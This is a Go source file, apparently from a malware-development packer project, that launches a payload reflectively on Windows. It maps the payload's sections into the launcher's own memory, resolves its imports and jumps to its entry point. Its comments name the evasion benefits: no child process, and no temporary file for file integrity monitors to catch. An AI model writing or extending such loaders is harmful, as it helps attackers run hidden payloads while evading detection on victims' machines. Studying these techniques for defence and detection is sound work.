//go:build windows

package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/pe/packer/runtime"
)

// executePayloadReflective loads payload in-process via the existing
// pe/packer/runtime PE mapper + entry-point trampoline. The payload's
// PT_LOAD-equivalent sections (.text, .data, .rdata, …) get
// VirtualAlloc'd into our address space, base relocations applied,
// imports resolved against the host process's already-loaded DLLs,
// per-section page protections applied, then the entry point is
// invoked via syscall.SyscallN.
//
// vs. temp file + CreateProcess (executePayload):
//   - Process tree shows ONE binary — no child PID.
//   - No transient TMP/* file visible to file integrity monitors.
//   - The payload's IAT is resolved against the launcher's
//     loaded modules — kernel32, ntdll, etc. are shared between
//     launcher and payload.
//   - Trade-off: payload must be a Windows PE this loader supports
//     (PE32+, AMD64; no TLS callbacks; standard import directory).
//
// Same MALDEV_PACKER_RUN_E2E gate as the Linux reflective path: the
// runtime sets it itself before invoking PreparedImage.Run.
func executePayloadReflective(payload []byte, _ []string) error {
	if err := os.Setenv("MALDEV_PACKER_RUN_E2E", "1"); err != nil {
		return fmt.Errorf("setenv: %w", err)
	}
	img, err := runtime.Prepare(payload)
	if err != nil {
		return fmt.Errorf("runtime.Prepare: %w", err)
	}
	// Run() typically does NOT return — most EXEs end via ExitProcess.
	// If it does return, we got control back; that means the payload
	// finished cleanly without exiting the process. Pass the success
	// up the launcher's exit chain.
	return img.Run()
}
